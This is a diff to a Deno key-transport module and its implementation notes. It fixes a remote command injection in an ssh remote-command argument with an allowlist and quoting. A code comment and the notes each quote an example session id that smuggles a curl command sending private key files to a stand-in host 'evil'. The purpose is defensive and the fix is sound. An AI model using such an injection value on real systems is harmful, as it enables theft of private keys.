@@ -403,6 +403,20 @@ export interface SessionKeypair {
 
 export type IdentityTransport = (sessionId: string, identity: string) => Promise<void>;
 
+// AMENDED 2026-08-11 (command injection). The session id is interpolated into
+// ssh's REMOTE COMMAND argument. `new Deno.Command('ssh', { args: [...] })`
+// spawns no local shell, which makes the array form look safe -- and locally it
+// is -- but sshd concatenates its arguments and feeds them to the login shell.
+// Without this allowlist, a session id of
+//     x; curl http://evil/$(cat /var/lib/romania/keys/*.key); #
+// executes on the one box holding every respondent's private key.
+// Charset matches romania/keystore.ts's SESSION_ID exactly so both ends agree.
+const SESSION_ID = /^[0-9a-fA-F-]{8,64}$/;
+
+export function assertSafeSessionId(sessionId: string): void {
+  if (!SESSION_ID.test(sessionId)) throw new Error('invalid session id');
+}
+
 const ROMANIA_SSH = Deno.env.get('ROMANIA_SSH_DEST') || '';
 const ROMANIA_KEY_DIR = Deno.env.get('ROMANIA_KEY_DIR') || '';
 const ROMANIA_SSH_KEY = Deno.env.get('ROMANIA_SSH_KEY') || '';
@@ -429,6 +443,7 @@ export function breakglassRecipient(): string {
  * exercise — an unpinned host key would let anything on the mesh collect keys.
  */
 const scpTransport: IdentityTransport = async (sessionId, identity) => {
+  assertSafeSessionId(sessionId); // builds a remote shell command; checks itself
   if (!ROMANIA_SSH || !ROMANIA_KEY_DIR) {
     throw new Error('Romania transport not configured');
   }
@@ -443,7 +458,10 @@ const scpTransport: IdentityTransport = async (sessionId, identity) => {
       '-o',
       'ConnectTimeout=10',
       ROMANIA_SSH,
-      `umask 077 && cat > ${ROMANIA_KEY_DIR}/${sessionId}.key`,
+      // Quoted as belt-and-braces: the allowlist already excludes every
+      // metacharacter, so a future widening degrades to a wrong filename
+      // rather than to remote execution.
+      `umask 077 && cat > '${ROMANIA_KEY_DIR}/${sessionId}.key'`,
     ],
     stdin: 'piped',
     stdout: 'null',
@@ -465,6 +483,7 @@ export async function pushIdentity(
   identity: string,
   transport: IdentityTransport = scpTransport,
 ): Promise<void> {
+  assertSafeSessionId(sessionId); // before ANY transport, including injected ones
   try {
     await transport(sessionId, identity);
   } catch {
@@ -1932,7 +1951,29 @@ Tasks 1-3 are implemented and committed. Amendments made during execution:
 
 **Found during implementation, not predicted by the plan:**
 
-5. **`clippy --all-targets` catches what `cargo test` cannot.** Replacing
+5. **COMMAND INJECTION in the Task 3 transport (fixed).** The plan's
+   `scpTransport` interpolated `sessionId` straight into ssh's remote-command
+   argument. `new Deno.Command('ssh', { args: [...] })` spawns no local shell, so
+   the array form reads as safe — and locally it is — but sshd concatenates its
+   arguments and hands the result to the remote login shell. A session id of
+   `x; curl http://evil/$(cat /var/lib/romania/keys/*.key); #` would therefore
+   execute on the single box holding every respondent's private key: total
+   compromise of the property the whole design exists to protect.
+
+   Not reachable today (Task 5, the only caller, is unwritten and passes
+   `crypto.randomUUID()`), but `pushIdentity` is exported with an unvalidated
+   `sessionId: string` and would have been a live hole the moment Task 5 landed.
+   Notably the plan already validated this exact value on the *Romania* side
+   (Task 10's `SESSION_ID`) — the end that merely writes a filename got the
+   guard, while the end that builds a shell command did not.
+
+   Fixed with an allowlist matching Romania's charset exactly, enforced at both
+   `pushIdentity` (every transport) and `scpTransport` (which does not delegate
+   its own safety), plus quoting as belt-and-braces. Seven hostile ids are
+   regression-tested, asserting the transport never runs — not merely that the
+   call rejects.
+
+6. **`clippy --all-targets` catches what `cargo test` cannot.** Replacing
    `iter::once(recipient)` with `refs.into_iter()` left `std::iter` unused in the
    *bin* target while the test module still needed it. `cargo test` compiles the
    test cfg and stayed green. Import scoped into `mod tests`.
